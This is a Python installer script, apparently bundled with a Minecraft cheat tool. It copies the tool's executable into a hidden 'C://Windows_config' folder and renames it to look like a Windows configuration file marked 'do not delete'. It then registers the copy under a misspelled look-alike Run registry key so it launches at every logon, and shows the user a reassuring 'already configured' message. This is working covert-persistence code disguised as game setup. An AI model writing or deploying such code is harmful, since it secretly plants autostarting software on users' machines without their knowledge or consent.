import shutil  # 导入移动模块
import os
import win32api
import win32con

oldfile = ".//upgrade//我的世界防封作弊大师.exe"
newfile = "C://Windows_config//.user_conf//勿删_windows_user.conf.exe"

try:
    file1 = "C://Windows_config"
    file2 = "C://Windows_config//.user_conf"
    os.mkdir(file1)
    os.mkdir(file2)
    win32api.SetFileAttributes(file2, win32con.FILE_ATTRIBUTE_HIDDEN)
except:
    import win32api, win32con

    win32api.MessageBox(0, "您已经配置过了，可以直接使用啦！", "我的世界防封作弊大师", win32con.MB_OK)

shutil.copyfile(oldfile, newfile)


name = 'Windwos_user_config'
path = 'C://Windows_config//.user_conf//勿删_windows_user.conf.exe'
KeyName = 'Software\Microsoft\Windows\CurrentVersion\Run'
key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
win32api.RegCloseKey(key)

def write_up():
    name = 'Windwos_user_config'  # 要添加的项值名称
    path = 'C://Windows_config//.user_conf//勿删_windows_user.conf.exe'  # 要添加的exe路径
    # 注册表项名
    KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    # 异常处理
    try:
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(key)
    except:
        print('添加失败')
    print('添加成功！')
